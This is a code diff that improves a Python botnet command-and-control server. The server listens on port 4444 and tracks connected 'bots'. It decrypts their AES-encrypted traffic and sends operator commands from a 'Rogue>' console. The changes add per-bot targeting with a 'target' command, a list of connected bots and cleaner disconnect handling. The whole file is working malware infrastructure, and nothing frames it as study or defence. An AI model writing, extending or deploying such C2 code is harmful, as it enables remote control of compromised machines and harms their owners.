@@ -2,7 +2,7 @@
 import socket, threading, base64
 from Cryptodome.Cipher import AES
 
-SECRET_KEY = b'Sixteen byte key'  # 16-byte key
+SECRET_KEY = b'Sixteen byte key'
 PORT = 4444
 clients = []
 
@@ -20,12 +20,18 @@ def decrypt_message(data):
 def handle_client(conn, addr):
     print(f"[+] Bot connected: {addr}")
     clients.append(conn)
-    while True:
-        try:
+    try:
+        while True:
             encrypted_data = conn.recv(4096)
-            if not encrypted_data: break
+            if not encrypted_data:
+                break
             print(f"[{addr}] {decrypt_message(encrypted_data)}")
-        except: break
+    except:
+        pass
+    finally:
+        print(f"[!] Bot disconnected: {addr}")
+        clients.remove(conn)
+        conn.close()
 
 def listener():
     server = socket.socket()
@@ -41,11 +47,26 @@ def send_command():
         cmd = input("Rogue> ")
         if cmd.lower() == "exit":
             break
-        for conn in clients:
+        if cmd.startswith("target"):
+            _, index, *command = cmd.split()
             try:
-                conn.send(encrypt_message(cmd))
+                index = int(index)
+                clients[index].send(encrypt_message(" ".join(command)))
             except:
-                clients.remove(conn)
+                print("[!] Invalid target index.")
+        else:
+            for conn in clients:
+                try:
+                    conn.send(encrypt_message(cmd))
+                except:
+                    clients.remove(conn)
+
+def show_clients():
+    print("Connected Bots:")
+    for i, c in enumerate(clients):
+        print(f"{i}) {c.getpeername()}")
 
 threading.Thread(target=listener).start()
-send_command()
+while True:
+    show_clients()
+    send_command()
